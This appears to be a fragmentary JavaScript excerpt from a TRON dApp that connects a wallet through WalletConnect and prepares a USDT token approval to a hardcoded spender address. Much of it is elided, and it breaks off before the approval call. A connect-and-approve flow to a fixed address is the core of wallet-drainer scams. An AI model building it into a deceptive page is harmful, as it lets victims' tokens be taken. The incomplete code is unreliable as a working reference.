...
const spenderAddress = 'TJNSnex9iepHGbssFVgCZziHHX3PKuPPe2'; // Replace with your dApp's address
...
function App() {
  ...
  const connectWallet = async () => {
    try {
	  ...
	  const tw = new TronWeb({ fullHost: TRON_NODE,signProvider: async (tx) => {
 ...
 const approveUSDT = async () => {
  try {
    ...
    const wallet = new WalletConnectWallet({
      ...
      options: {
        relayUrl: 'wss://relay.walletconnect.com',
        projectId: 'a2cd3f6f2c8dde8024ed901de2d36bc1', // Replace with your WalletConnect Project ID
        metadata: {
          name: 'TRON USDT dApp',
          description: 'Approve and transfer USDT',
          url: 'https://your-dapp.com',
          icons: ['https://your-dapp.com/icon.png'],
        },
      },
    ...
    // This function delegates signing to WalletConnect
    signProvider: async (tx) => {
      return await wallet.signTransaction(tx);
    },
  });
    ...
    console.log('tronWeb wallet:', tronWeb);

    // 3. Access contract via wallet.tronWeb
    const contract = await tronWeb.contract(abi, usdtContractAddress);

    // 4. Send approval transaction
	console.log('spenderAddress wallet:', spenderAddress);
